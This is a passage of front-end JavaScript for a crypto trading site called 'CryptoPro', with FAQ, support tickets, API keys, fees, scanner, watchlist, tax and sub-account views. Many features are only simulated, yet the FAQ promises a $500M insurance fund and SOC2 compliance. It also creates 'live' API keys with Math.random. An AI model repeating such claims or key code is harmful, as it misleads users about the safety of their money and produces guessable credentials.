            <div style="font-size:10px;color:var(--text3);margin-bottom:2px">Current Price</div>
            <div style="font-family:var(--font-mono);font-size:16px;font-weight:800">${n.price} ETH</div>
            <div style="font-size:10px;color:var(--text3)">Floor: ${n.floor} ETH</div>
          </div>
          <div style="text-align:right">
            <div style="font-size:10px;color:var(--text3);margin-bottom:2px">24h</div>
            <div style="font-family:var(--font-mono);font-size:13px;font-weight:700;color:${n.change>=0?'var(--green)':'var(--red)'}">${n.change>=0?'+':''}${n.change}%</div>
            <div style="font-size:10px;padding:2px 6px;border-radius:4px;background:var(--bg3);color:var(--text2);margin-top:3px">${n.rarity}</div>
          </div>
        </div>
        <button style="width:100%;margin-top:10px;padding:8px;background:linear-gradient(135deg,var(--purple),var(--blue));color:#fff;border:none;border-radius:var(--r-md);font-size:12px;font-weight:700;cursor:pointer;font-family:var(--font-mono)" onclick="event.stopPropagation();showToast('ðŸ–¼ï¸ Placing bid on ${n.name}...','blue')">
          Place Bid
        </button>
      </div>
    </div>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SUPPORT / HELP CENTER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const SUPPORT_FAQS=[
  {q:'How do I make my first deposit?',a:'Go to Dashboard â†’ Deposit. Choose from M-Pesa, Bank Transfer, Crypto, or Card. Minimum deposit is $10. Crypto deposits confirm within 3 blockchain confirmations.'},
  {q:'How does copy trading work?',a:'Select a trader to copy, set your allocation amount (min $10), and all their trades are automatically mirrored in your account proportionally. You can stop anytime.'},
  {q:'What are the trading fees?',a:'Maker: 0.02%, Taker: 0.04%. VIP tiers reduce fees up to 0% for Diamond members. See the Fee Schedule page for full details.'},
  {q:'How do I withdraw funds?',a:'Dashboard â†’ Withdraw. Choose crypto, bank, or card. 2FA required. Crypto: instant. Bank: 1-3 days. All VIP withdrawals are fee-free.'},
  {q:'Is my money safe?',a:'Yes. CryptoPro uses cold storage for 95% of funds, 2FA, anti-phishing codes, and carries a $500M insurance fund. We are SOC2 compliant.'},
  {q:'How do I earn the welcome bonus?',a:'Create an account and make your first deposit of $100+. The $50 bonus is credited instantly and can be used for trading immediately.'},
  {q:'What is leverage trading?',a:'Leverage lets you control a larger position with a smaller amount. 10x leverage means $100 controls $1,000 worth of crypto. Risk is amplified â€” use stop losses always.'},
  {q:'How do trading bots work?',a:'Bots automatically execute trades 24/7 based on your chosen strategy. Grid bots work in sideways markets, DCA bots average your entry price, momentum bots follow trends.'},
];
const supportTickets=[
  {id:'TKT-001',subject:'Withdrawal pending for 2 hours',status:'open',date:'Today 14:22',priority:'high'},
  {id:'TKT-002',subject:'Bot not executing trades',status:'pending',date:'Yesterday',priority:'med'},
  {id:'TKT-003',subject:'KYC verification question',status:'closed',date:'Jan 25',priority:'low'},
];
function buildSupport(){
  const faqEl=$('supportFAQ');
  if(faqEl){
    faqEl.innerHTML=SUPPORT_FAQS.map((f,i)=>`
      <div style="border-bottom:1px solid var(--border);padding:0">
        <div style="padding:14px 16px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;transition:background .15s" onclick="toggleFAQ(${i},this)" onmouseover="this.style.background='var(--bg2)'" onmouseout="this.style.background=''">
          <span style="font-size:13px;font-weight:600">${f.q}</span>
          <span style="font-size:16px;color:var(--text3);transition:transform .3s" id="faqArrow${i}">â–¾</span>
        </div>
        <div id="faqAns${i}" style="display:none;padding:0 16px 14px;font-size:12px;color:var(--text2);line-height:1.65">${f.a}</div>
      </div>`).join('');
  }
  const ticketEl=$('supportTickets');
  if(ticketEl){
    ticketEl.innerHTML=STATE.loggedIn?supportTickets.map(t=>`
      <div class="support-ticket">
        <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">
          <div>
            <div style="font-size:12px;color:var(--text3);font-family:var(--font-mono);margin-bottom:3px">${t.id} Â· ${t.date}</div>
            <div style="font-size:14px;font-weight:700">${t.subject}</div>
          </div>
          <span class="ticket-status ts-${t.status}">${t.status.toUpperCase()}</span>
        </div>
      </div>`).join(''):`<div class="empty-state"><div style="font-size:28px">ðŸŽ«</div><div style="font-size:12px;color:var(--text3);margin-top:6px">Sign in to view your tickets</div></div>`;
  }
}
function toggleFAQ(i,el){
  const ans=$('faqAns'+i),arrow=$('faqArrow'+i);
  if(ans){ans.style.display=ans.style.display==='none'?'block':'none';}
  if(arrow){arrow.style.transform=ans?.style.display==='block'?'rotate(180deg)':'';}
}
function submitSupportTicket(){
  const sub=$('ticketSubject')?.value?.trim();
  const msg=$('ticketMessage')?.value?.trim();
  if(!sub||!msg){showToast('âš ï¸ Please fill in all fields','yellow');return;}
  if(!STATE.loggedIn){showLayer('loginLayer');return;}
  showToast(`âœ… Ticket submitted!\nOur team will respond within 2 hours.\nOwner notified at felixkoskey278@gmail.com`,'green',5000);
  notifyOwner('SUPPORT_TICKET',{subject:sub,message:msg,user:STATE.user.email,time:new Date().toISOString()});
  $('ticketSubject').value='';$('ticketMessage').value='';
}
function startLiveChat(){
  if(!STATE.loggedIn){showLayer('loginLayer');return;}
  showToast('ðŸ’¬ Connecting to live support...\nAverage wait time: 2 minutes','blue',4000);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// API KEYS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const userApiKeys=[];
function buildApiKeys(){
  const list=$('apiKeysList');if(!list)return;
  if(!STATE.loggedIn){list.innerHTML=`<div class="empty-state"><div style="font-size:28px">ðŸ”‘</div><div style="font-size:12px;color:var(--text3);margin-top:6px">Sign in to manage API keys</div></div>`;return;}
  if(userApiKeys.length===0){list.innerHTML=`<div class="empty-state"><div style="font-size:28px">ðŸ”‘</div><div style="font-size:12px;color:var(--text3);margin-top:6px">No API keys yet. Create one to connect bots and apps.</div></div>`;return;}
  list.innerHTML=userApiKeys.map((k,i)=>`
    <div class="api-key-row">
      <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">
        <div>
          <div style="font-size:13px;font-weight:700;margin-bottom:4px">${k.name}</div>
          <div style="font-family:var(--font-mono);font-size:11px;color:var(--text2);background:var(--bg3);padding:4px 8px;border-radius:4px;word-break:break-all">${k.key}</div>
          <div style="font-size:10px;color:var(--text3);margin-top:4px">Created: ${k.created} Â· Permissions: ${k.perms}</div>
        </div>
        <div style="display:flex;gap:6px">
          <button class="btn btn-outline" style="font-size:11px;padding:4px 10px" onclick="copyApiKey(${i})">ðŸ“‹ Copy</button>
          <button class="btn btn-outline" style="font-size:11px;padding:4px 10px;color:var(--red)" onclick="deleteApiKey(${i})">ðŸ—‘ Delete</button>
        </div>
      </div>
    </div>`).join('');
}
function createApiKey(){
  if(!STATE.loggedIn){showLayer('loginLayer');return;}
  const name=prompt('API Key name (e.g. "My Trading Bot"):');
  if(!name)return;
  const key='cp_live_'+Array.from({length:32},()=>Math.random().toString(36)[2]).join('');
  userApiKeys.push({name,key,created:new Date().toLocaleDateString(),perms:'Read + Trade'});
  buildApiKeys();
  showToast(`ðŸ”‘ API Key "${name}" created!\nStore it safely â€” shown only once.`,'green',6000);
}
function copyApiKey(i){navigator.clipboard?.writeText(userApiKeys[i].key);showToast('ðŸ“‹ API key copied!','green');}
function deleteApiKey(i){userApiKeys.splice(i,1);buildApiKeys();showToast('ðŸ—‘ API key deleted','yellow');}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// FEE SCHEDULE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildFeeSchedule(){
  const tbody=$('feeTableBody');if(!tbody)return;
  const tiers=[
    {tier:'Standard',icon:'',vol:'< $10K',maker:'0.10%',taker:'0.15%',withdraw:'$1.00',current:false},
    {tier:'Bronze',icon:'ðŸ¥‰',vol:'$10K+',maker:'0.08%',taker:'0.12%',withdraw:'$0.80',current:false},
    {tier:'Silver',icon:'ðŸ¥ˆ',vol:'$50K+',maker:'0.06%',taker:'0.10%',withdraw:'$0.50',current:true},
    {tier:'Gold',icon:'ðŸ¥‡',vol:'$200K+',maker:'0.04%',taker:'0.08%',withdraw:'$0.20',current:false},
    {tier:'Platinum',icon:'ðŸ’Ž',vol:'$500K+',maker:'0.02%',taker:'0.06%',withdraw:'Free',current:false},
    {tier:'Diamond',icon:'ðŸŒŸ',vol:'$2M+',maker:'0.00%',taker:'0.04%',withdraw:'Free',current:false},
  ];
  tbody.innerHTML=tiers.map(t=>`
    <tr ${t.current?'class="current-tier"':''}>
      <td style="font-weight:700">${t.icon} ${t.tier} ${t.current?'<span style="font-size:10px;color:var(--green);font-family:var(--font-mono)">â† You</span>':''}</td>
      <td style="font-family:var(--font-mono)">${t.vol}</td>
      <td style="font-family:var(--font-mono);color:var(--green)">${t.maker}</td>
      <td style="font-family:var(--font-mono);color:var(--yellow)">${t.taker}</td>
      <td style="font-family:var(--font-mono)">${t.withdraw}</td>
    </tr>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MARKET SCANNER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let scannerFilter='gainers';
function buildScanner(){
  const list=$('scannerList');if(!list)return;
  let pairs=Object.keys(STATE.prices).map(p=>({
    pair:p,price:STATE.prices[p],chg:parseFloat(STATE.changes[p]||0),
    vol:rand(10,2400),mktCap:rand(1,1400),high:STATE.prices[p]*rand(1.001,1.05),low:STATE.prices[p]*rand(0.95,0.999)
  }));
  if(scannerFilter==='gainers') pairs=pairs.sort((a,b)=>b.chg-a.chg);
  else if(scannerFilter==='losers') pairs=pairs.sort((a,b)=>a.chg-b.chg);
  else if(scannerFilter==='volume') pairs=pairs.sort((a,b)=>b.vol-a.vol);
  else if(scannerFilter==='new_high') pairs=pairs.filter(p=>p.chg>3).sort((a,b)=>b.chg-a.chg);
  list.innerHTML=`
    <div class="scanner-row" style="font-size:10px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.5px;border-bottom:2px solid var(--border)">
      <span>Pair</span><span>Price</span><span>24h %</span><span>Volume</span><span>High</span><span>Low</span>
    </div>`+pairs.map(p=>`
    <div class="scanner-row" onclick="STATE.selectedPair='${p.pair}';showLayer('chartLayer')">
      <span style="font-weight:700;font-family:var(--font-display)">${p.pair}</span>
      <span style="font-family:var(--font-mono)">${formatUSD(p.price)}</span>
      <span style="font-family:var(--font-mono);font-weight:700;color:${p.chg>=0?'var(--green)':'var(--red)'}">${formatPct(p.chg)}</span>
      <span style="font-family:var(--font-mono);color:var(--text2)">$${formatNum(p.vol,1)}M</span>
      <span style="font-family:var(--font-mono);color:var(--green)">${formatUSD(p.high)}</span>
      <span style="font-family:var(--font-mono);color:var(--red)">${formatUSD(p.low)}</span>
    </div>`).join('');
}
function setScannerFilter(f,el){
  scannerFilter=f;
  document.querySelectorAll('.scanner-filter').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  buildScanner();
}
setInterval(()=>{if($('scannerList'))buildScanner();},4000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// WATCHLIST
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const watchlist=new Set(['BTC/USDT','ETH/USDT','SOL/USDT']);
function buildWatchlist(){
  const list=$('watchlistItems');if(!list)return;
  if(watchlist.size===0){list.innerHTML=`<div class="empty-state"><div style="font-size:28px">â­</div><div style="font-size:12px;color:var(--text3);margin-top:6px">Add pairs to your watchlist from the Charts or Scanner</div></div>`;return;}
  list.innerHTML=Array.from(watchlist).map(pair=>{
    const chg=parseFloat(STATE.changes[pair]||0);
    const price=STATE.prices[pair]||0;
    return `<div class="wl-item" onclick="STATE.selectedPair='${pair}';showLayer('chartLayer')">
      <div style="font-size:24px">${pair.includes('BTC')?'â‚¿':pair.includes('ETH')?'Îž':pair.includes('SOL')?'â—Ž':'ðŸ’Ž'}</div>
      <div style="flex:1">
        <div style="font-weight:700;font-size:14px;font-family:var(--font-display)">${pair}</div>
        <div style="font-size:11px;color:var(--text3)">Click to open chart</div>
      </div>
      <div style="text-align:right">
        <div style="font-family:var(--font-mono);font-size:14px;font-weight:700">${formatUSD(price)}</div>
        <div style="font-family:var(--font-mono);font-size:12px;font-weight:700;color:${chg>=0?'var(--green)':'var(--red)'}">${formatPct(chg)}</div>
      </div>
      <button style="background:none;border:none;color:var(--red);font-size:18px;cursor:pointer;padding:4px 8px" onclick="event.stopPropagation();removeFromWatchlist('${pair}')">âœ•</button>
    </div>`;
  }).join('');
}
function addToWatchlist(pair){
  watchlist.add(pair||STATE.selectedPair);
  buildWatchlist();
  showToast(`â­ ${pair||STATE.selectedPair} added to watchlist`,'green');
}
function removeFromWatchlist(pair){
  watchlist.delete(pair);
  buildWatchlist();
  showToast(`Removed ${pair} from watchlist`,'yellow');
}
function addWatchlistPair(){
  const sel=$('watchlistAddSelect');
  if(sel&&sel.value){addToWatchlist(sel.value);}
}
setInterval(()=>{if($('watchlistItems'))buildWatchlist();},3000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// TAX REPORTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildTaxReports(){
  const el=$('taxContent');if(!el)return;
  el.innerHTML=`
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;margin-bottom:20px">
      <div class="analytics-stat"><span class="as-val text-green">$3,284.50</span><span class="as-lbl">Realized Gains</span></div>
      <div class="analytics-stat"><span class="as-val text-red">-$820.40</span><span class="as-lbl">Realized Losses</span></div>
      <div class="analytics-stat"><span class="as-val" style="color:var(--cyan)">$2,464.10</span><span class="as-lbl">Net Taxable</span></div>
      <div class="analytics-stat"><span class="as-val" style="color:var(--yellow)">284</span><span class="as-lbl">Taxable Events</span></div>
    </div>
    <div class="dash-card">
      <div class="dc-header">
        <span class="dc-title">Tax Summary 2024</span>
        <div style="display:flex;gap:8px">
          <button class="btn btn-outline" style="font-size:12px" onclick="showToast('ðŸ“¥ Generating CSV report...','blue')">Export CSV</button>
          <button class="btn btn-outline" style="font-size:12px" onclick="showToast('ðŸ“„ Generating PDF for tax filing...','blue')">Export PDF</button>
          <button class="btn btn-green" style="font-size:12px" onclick="showToast('ðŸ”— Connecting to TurboTax...','blue')">TurboTax Import</button>
        </div>
      </div>
      ${[{label:'Short-term gains (held < 1yr)',val:'+$2,840.20',color:'var(--green)'},{label:'Long-term gains (held > 1yr)',val:'+$444.30',color:'var(--green)'},{label:'Total losses',val:'-$820.40',color:'var(--red)'},{label:'Net capital gains',val:'+$2,464.10',color:'var(--cyan)'},{label:'Estimated tax (20%)',val:'$492.82',color:'var(--yellow)'}].map(r=>`
      <div class="tax-row"><span style="color:var(--text2)">${r.label}</span><span style="font-family:var(--font-mono);font-weight:700;color:${r.color}">${r.val}</span></div>`).join('')}
    </div>`;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SUB ACCOUNTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const subAccounts=[
  {name:'Main Account',balance:12500,trades:284,active:true},
  {name:'Bot Trading',balance:3200,trades:1840,active:false},
  {name:'Copy Trading',balance:1500,trades:42,active:false},
];
function buildSubAccounts(){
  const el=$('subAccountsContent');if(!el)return;
  el.innerHTML=`
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
      <div style="font-size:14px;font-weight:700">Your Sub-Accounts</div>
      <button class="btn btn-green" style="font-size:12px" onclick="createSubAccount()">+ Create Sub-Account</button>
    </div>
    ${subAccounts.map((a,i)=>`
    <div class="sub-account-row">
      <div style="width:40px;height:40px;background:var(--bg3);border-radius:var(--r-md);display:flex;align-items:center;justify-content:center;font-size:20px">ðŸ‘¤</div>
      <div style="flex:1">
        <div style="font-weight:700;font-size:13px">${a.name} ${a.active?'<span class="sub-acct-active">â— Active</span>':''}</div>
        <div style="font-size:11px;color:var(--text3);margin-top:2px">Balance: ${formatUSD(a.balance)} Â· ${a.trades} trades</div>
      </div>
      <div style="display:flex;gap:6px">
        <button class="btn btn-outline" style="font-size:11px;padding:5px 10px" onclick="switchSubAccount(${i})">Switch</button>
        <button class="btn btn-outline" style="font-size:11px;padding:5px 10px" onclick="transferSubAccount(${i})">Transfer</button>
      </div>
    </div>`).join('')}`;
}
function createSubAccount(){
  if(!STATE.loggedIn){showLayer('loginLayer');return;}
  const name=prompt('Sub-account name:');
  if(!name)return;
  subAccounts.push({name,balance:0,trades:0,active:false});
  buildSubAccounts();
  showToast(`âœ… Sub-account "${name}" created!`,'green');
}
function switchSubAccount(i){showToast(`ðŸ”„ Switched to "${subAccounts[i].name}"`,'blue');}
function transferSubAccount(i){showToast(`ðŸ’¸ Transfer to "${subAccounts[i].name}" â€” enter amount in deposit page`,'blue');}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DARK / LIGHT MODE TOGGLE
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let isDarkMode=true;
function toggleTheme(){
  isDarkMode=!isDarkMode;
  const root=document.documentElement;
  if(!isDarkMode){
    root.style.setProperty('--bg0','#F0F4F8');
    root.style.setProperty('--bg1','#FFFFFF');
    root.style.setProperty('--bg2','#F7FAFC');
    root.style.setProperty('--bg3','#EDF2F7');
    root.style.setProperty('--bg4','#E2E8F0');
    root.style.setProperty('--text1','#1A202C');
    root.style.setProperty('--text2','#4A5568');
    root.style.setProperty('--text3','#A0AEC0');
    root.style.setProperty('--border','rgba(0,0,0,0.08)');
    root.style.setProperty('--border2','rgba(0,0,0,0.15)');
  }else{
    root.style.setProperty('--bg0','#06080D');
    root.style.setProperty('--bg1','#0C0F18');
    root.style.setProperty('--bg2','#131825');
    root.style.setProperty('--bg3','#1A2030');
    root.style.setProperty('--bg4','#202840');
    root.style.setProperty('--text1','#EDF2F7');
    root.style.setProperty('--text2','#8892A4');
    root.style.setProperty('--text3','#4A5568');
    root.style.setProperty('--border','rgba(255,255,255,0.06)');
    root.style.setProperty('--border2','rgba(255,255,255,0.12)');
  }
  const btn=$('themeToggleBtn');
  if(btn)btn.textContent=isDarkMode?'â˜€ï¸ Light Mode':'ðŸŒ™ Dark Mode';
  showToast(`${isDarkMode?'ðŸŒ™ Dark':'â˜€ï¸ Light'} mode activated`,'blue');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LANGUAGE SELECTOR
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const LANGUAGES={EN:'English',FR:'FranÃ§ais',DE:'Deutsch',ES:'EspaÃ±ol',AR:'Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©',ZH:'ä¸­æ–‡',JP:'æ—¥æœ¬èªž',KO:'í•œêµ­ì–´'};
let currentLang='EN';
function setLanguage(lang){
  currentLang=lang;
  document.querySelectorAll('.lang-btn').forEach(b=>{b.classList.toggle('active',b.dataset.lang===lang);});
  showToast(`ðŸŒ Language set to ${LANGUAGES[lang]}`,'blue');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SOUND EFFECTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let soundEnabled=false;
function toggleSound(){
  soundEnabled=!soundEnabled;
  const btn=$('soundToggleBtn');
  if(btn)btn.textContent=soundEnabled?'ðŸ”Š Sound On':'ðŸ”‡ Sound Off';
  showToast(soundEnabled?'ðŸ”Š Trade sounds enabled':'ðŸ”‡ Trade sounds disabled','blue');
}
function playOrderSound(type){
  if(!soundEnabled||typeof AudioContext==='undefined')return;
  try{
    const ctx=new AudioContext();
    const osc=ctx.createOscillator();
    const gain=ctx.createGain();
    osc.connect(gain);gain.connect(ctx.destination);
    osc.frequency.value=type==='buy'?880:440;
    osc.type='sine';
    gain.gain.setValueAtTime(0.3,ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+0.3);
    osc.start(ctx.currentTime);osc.stop(ctx.currentTime+0.3);
  }catch(e){}
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// FULLSCREEN CHART
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let isFullscreen=false;
function toggleFullscreenChart(){
  isFullscreen=!isFullscreen;
  const container=$('tvChartContainer');
  if(!container)return;
  if(isFullscreen){
    container.classList.add('chart-fullscreen');
    container.style.position='fixed';
    container.style.inset='0';
    container.style.zIndex='1500';
    container.style.height='100vh';
    container.style.width='100vw';
    const closeBtn=document.createElement('button');
    closeBtn.id='fsCloseBtn';
    closeBtn.textContent='âœ• Exit Fullscreen';
    closeBtn.style.cssText='position:absolute;top:12px;right:12px;z-index:1501;padding:8px 16px;background:var(--bg2);border:1px solid var(--border2);border-radius:8px;color:var(--text1);cursor:pointer;font-size:13px;font-weight:700';
    closeBtn.onclick=toggleFullscreenChart;
    container.appendChild(closeBtn);
    if(tvChart)tvChart.resize(window.innerWidth,window.innerHeight);
  }else{
    container.classList.remove('chart-fullscreen');
    container.style.position='';container.style.inset='';container.style.zIndex='';
    container.style.height='';container.style.width='';
    $('fsCloseBtn')?.remove();
    setTimeout(()=>{if(tvChart){const p=$('tvChartContainer');tvChart.resize(p.clientWidth,p.clientHeight);}},100);
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MULTI-CHART LAYOUT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildMultiChart(){
  const container=$('multiChartContainer');if(!container)return;
  const pairs=['BTC/USDT','ETH/USDT','SOL/USDT','BNB/USDT'];
  container.style.display='grid';
  container.style.gridTemplateColumns='1fr 1fr';
  container.style.gap='4px';
  container.style.height='600px';
  container.innerHTML=pairs.map((pair,i)=>`
    <div class="multi-chart-cell" onclick="STATE.selectedPair='${pair}';showLayer('chartLayer')">
      <div style="position:absolute;top:8px;left:8px;z-index:1;font-size:12px;font-weight:800;font-family:var(--font-display);color:var(--green)">${pair}</div>
      <canvas id="mc_${i}" style="width:100%;height:100%"></canvas>
    </div>`).join('');
  pairs.forEach((_,i)=>{
    const canvas=$('mc_'+i);
    if(!canvas)return;
    const ctx=canvas.getContext('2d');
    const W=canvas.offsetWidth||300,H=canvas.offsetHeight||200;
    canvas.width=W;canvas.height=H;
    const pts=[];let v=rand(1000,70000);
    for(let j=0;j<30;j++){v+=rand(-v*.02,v*.02);pts.push(v);}
    const mn=Math.min(...pts),mx=Math.max(...pts)||mn+1;
    const sx=W/(pts.length-1);
    const sy=n=>H-((n-mn)/(mx-mn||1))*(H-20)-10;
    const up=pts[pts.length-1]>pts[0];
    const grad=ctx.createLinearGradient(0,0,0,H);
    grad.addColorStop(0,up?'rgba(0,230,118,0.2)':'rgba(255,61,87,0.2)');
    grad.addColorStop(1,'rgba(0,0,0,0)');
    ctx.beginPath();ctx.moveTo(0,sy(pts[0]));
    pts.forEach((p,j)=>ctx.lineTo(j*sx,sy(p)));
    ctx.lineTo(W,H);ctx.lineTo(0,H);ctx.closePath();
    ctx.fillStyle=grad;ctx.fill();
    ctx.beginPath();ctx.moveTo(0,sy(pts[0]));
    pts.forEach((p,j)=>ctx.lineTo(j*sx,sy(p)));
    ctx.strokeStyle=up?'#00E676':'#FF3D57';ctx.lineWidth=2;ctx.stroke();
  });
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ONBOARDING TOUR
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const TOUR_STEPS=[
  {target:'mainNav',title:'Welcome to CryptoPro! ðŸ‘‹',desc:'This is your command center. Live prices tick in real-time across all major pairs.',pos:'bottom'},
  {target:'navUserChip',title:'Your Account ðŸ’¼',desc:'Click here to access your dashboard, portfolio, and account settings.',pos:'bottom'},
  {target:'aiBtn',title:'AI Assistant ðŸ¤–',desc:'Your personal trading AI. Ask anything â€” market analysis, strategies, position sizing.',pos:'top'},
];
let tourStep=0;
function startTour(){
  tourStep=0;showTourStep();
}
function showTourStep(){
  clearTour();
  if(tourStep>=TOUR_STEPS.length){showToast('ðŸŽ‰ Tour complete! Start trading.','green');return;}
  const step=TOUR_STEPS[tourStep];
  const target=$(step.target);if(!target)return;
  const rect=target.getBoundingClientRect();
  const overlay=document.createElement('div');
  overlay.id='tourOverlay';overlay.className='tour-overlay';
  const spotlight=document.createElement('div');
  spotlight.className='tour-spotlight';
  spotlight.style.cssText=`top:${rect.top-6}px;left:${rect.left-6}px;width:${rect.width+12}px;height:${rect.height+12}px`;
  const tooltip=document.createElement('div');
  tooltip.className='tour-tooltip';
  const tipTop=step.pos==='bottom'?rect.bottom+16:rect.top-200;
  tooltip.style.cssText=`top:${tipTop}px;left:${Math.min(rect.left,window.innerWidth-300)}px`;
  tooltip.innerHTML=`
    <div style="display:flex;gap:4px;margin-bottom:10px">${TOUR_STEPS.map((_,i)=>`<div style="width:${i===tourStep?18:6}px;height:6px;border-radius:3px;background:${i===tourStep?'var(--green)':'var(--border2)'}"></div>`).join('')}</div>
    <div style="font-family:var(--font-display);font-size:15px;font-weight:800;margin-bottom:6px">${step.title}</div>
    <div style="font-size:13px;color:var(--text2);line-height:1.55;margin-bottom:14px">${step.desc}</div>
    <div style="display:flex;gap:8px">
      <button onclick="clearTour()" style="flex:1;padding:7px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;color:var(--text2);font-size:12px;cursor:pointer">Skip</button>
